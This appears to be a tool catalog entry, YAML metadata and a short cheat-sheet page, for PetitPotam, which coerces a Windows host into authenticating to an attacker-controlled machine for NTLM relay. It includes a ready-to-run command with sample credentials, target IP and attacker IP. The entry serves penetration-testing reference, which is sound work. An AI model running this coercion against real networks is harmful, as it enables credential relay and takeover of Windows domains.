---
trust_level: community
id: wadcom-petitpotam
namespace: wadcom:tool:petitpotam
name: "PetitPotam"
description: "PetitPotam leverages the MS-EFSRPC API to connect to a Windows host, hijack the authentication session, and trigger an authentication from the target host to an attacker controlled host (usually SMB or HTTP server). This captured authentication can then be relayed to authenticate to other hosts and perform more attacks. See more in ntlmrelayx.py."
version: "1.0.0"
capabilities:
  - network.coerce.authentication
platforms:
  - linux
techniques:
  - credential-access
execution:
  template: "petitpotam"
  sandbox: execFile
  timeout_seconds: 30
  shell: false
examples:
  - description: "Command execution"
    command: "python3 PetitPotam.py -d test.local -u john -p password123 10.10.10.2 10.10.10.1"
references:
  - label: "Reference 1"
    url: "https://github.com/topotam/PetitPotam"
  - label: "Reference 2"
    url: "https://www.truesec.com/hub/blog/from-stranger-to-da-using-petitpotam-to-ntlm-relay-to-active-directory"
items:
  - Hash
services:
  - RPC
  - SMB
---

# PetitPotam

PetitPotam leverages the MS-EFSRPC API to connect to a Windows host, hijack the authentication session, and trigger an authentication from the target host to an attacker controlled host (usually SMB or HTTP server). This captured authentication can then be relayed to authenticate to other hosts and perform more attacks. See more in ntlmrelayx.py.

Command Reference:

	Target IP: 10.10.10.1

	Attacker IP: 10.10.10.2

	Domain: test.local

	Username: john

	Password: password123

```
python3 PetitPotam.py -d test.local -u john -p password123 10.10.10.2 10.10.10.1
```

**Services:** RPC, NTLM

**Required:** Password, Username
